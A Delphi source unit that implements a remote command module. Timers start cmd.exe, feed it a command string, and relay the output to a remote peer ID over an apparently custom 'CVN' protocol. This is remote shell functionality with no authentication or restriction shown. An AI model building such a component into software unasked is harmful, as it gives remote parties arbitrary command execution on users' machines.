unit CVN_Remotecomm;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls,StdIORedirect;

type
  TRmComm = class(TForm)
    Timer3: TTimer;
    Timer1: TTimer;
    Timer2: TTimer;
    Timer4: TTimer;
    procedure Timer3Timer(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Timer4Timer(Sender: TObject);
  private
    { Private declarations }
    procedure output(sender:TObject;st:string);
     
  public
    { Public declarations }
    command:string;
    executer:integer;
    rmCommander:TStdIORedirect;

  end;

implementation
uses CVN_Protocol,CVN_csys;
{$R *.dfm}

procedure TRmComm.Timer3Timer(Sender: TObject);
begin
  timer3.Enabled:=false;
  timer4.Enabled:=true;
  rmCommander.OnOutputText:=nil;
  rmCommander.OnErrorText:=nil;
  rmCommander.AddInputText('exit');
end;

procedure TRmComm.output(sender: TObject; st: string);
begin
  CVN_SendCmdto(ProtocolToStr(cmdSendMsgtoID)+','+inttostr(executer)+'*rm: '+st);
end;

procedure TRmComm.Timer1Timer(Sender: TObject);
var
  arr: array[0..MAX_PATH] of Char;
  num: UINT;
begin
  num := GetWindowsDirectory(arr, MAX_PATH);
  timer1.Enabled:=false;
  timer2.Enabled:=true;
  rmCommander:=TStdIORedirect.Create(self);
  rmCommander.Run(arr+'\system32\cmd.exe','','');
end;

procedure TRmComm.Timer2Timer(Sender: TObject);
begin
  timer2.Enabled:=false;
  timer3.Enabled:=true;
  rmCommander.OnOutputText:=output;
  rmCommander.OnErrorText:=output;
  rmCommander.AddInputText(command);
end;

procedure TRmComm.Timer4Timer(Sender: TObject);
begin
  timer4.Enabled:=false;
  rmCommander.Terminate;
  freeandnil(rmCommander);
  freeandnil(self);  
end;

end.
